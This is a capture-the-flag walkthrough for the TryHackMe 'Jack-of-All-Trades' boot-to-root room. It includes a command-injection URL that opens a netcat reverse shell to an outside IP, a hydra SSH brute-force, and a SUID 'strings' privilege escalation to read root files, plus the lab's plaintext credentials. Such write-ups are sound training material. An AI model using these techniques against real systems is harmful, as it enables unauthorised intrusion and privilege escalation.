# [Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades)

## Boot-to-root originally designed for Securi-Tay 2020

# Flags

## Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

### User Flag

1. Scan all ports with nmap to identify running services

```bash
nmap -sV IP
```

![SCREEN01](https://github.com/user-attachments/assets/b0f4af15-afa3-4aef-a599-c5a96a5b8ea0)

2. Configure Firefox to access HTTP service on port 22
   - Navigate to `about:config` and set `network.security.ports.banned.override` to **22** as **string**

![SCREEN02](https://github.com/user-attachments/assets/73675b28-554d-44a7-81f6-183c4bdee304)

3. Analyze the main page source code at `http://<IP>:22/`

   - Reference to `/recovery.php` endpoint
   - Base64 encoded string containing password
   - Decode the string in [CyberChef](https://gchq.github.io/CyberChef/)
   - **Password:** `u?WtKSraq`

4. Examine `http://<IP>:22/recovery.php` source code

   - Decode the string in [CyberChef](https://gchq.github.io/CyberChef/): From Base32 -> From Hex -> ROT13
   - Link to wikipedia page `bit.ly/2TvYQ2S`

5. Download images from `http://<IP>:22/` and analyze with steghide
   - **Extracted credentials:** `jackinthebox:TplFxiSHjY`

```bash
steghide extract -sf header.jpg
# Password: u?WtKSraq
```

6. Start netcat listener, log in to the `http://IP/recovery.php` and add `?cmd=nc -c bash 10.10.123.224 4444` at the end of the url

```bash
nc -lvnp 4444
```

![SCREEN03](https://github.com/user-attachments/assets/a557b073-2370-44fb-a39b-836c76d7df85)

7. Establish stable shell, locate password list and save it to a file

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
cd /home
cat jacks_password_list
```

![SCREEN04](https://github.com/user-attachments/assets/be1974a9-bc99-47bf-865e-2c3ee8207a74)

8. Attack SSH service running on port 80
   - The credentials are: **jack:ITMJpGGIqg1jn?>@**

```bash
hydra -l jack -P passwords.txt ssh://IP:80
```

![SCREEN05](https://github.com/user-attachments/assets/052ab064-a64a-447f-ba7c-f43cddffe2f7)

9. Log in as jack, download the image, and get the user flag from it

```bash
ssh -p 80 jack@IP
# Password: ITMJpGGIqg1jn?>@

```

```bash
scp -P 80 jack@IP:/home/jack/user.jpg /root/user.jpg
# Password: ITMJpGGIqg1jn?>@
```

![SCREEN06](https://github.com/user-attachments/assets/b0380548-8ef8-474e-a6e4-b33af54bfeb3)

---

### Root Flag

1. Find SUID binaries to identify privilege escalation vectors

```bash
find / -perm -u=s -type f 2>/dev/null
```

![SCREEN07](https://github.com/user-attachments/assets/d851d00c-a9cb-4734-997c-580ca5501643)

2. Exploit the SUID `strings` binary to read the root flag

```bash
strings /root/root.txt
```

![SCREEN08](https://github.com/user-attachments/assets/da2c8af4-419d-4a8a-a637-1a1b8df06e54)
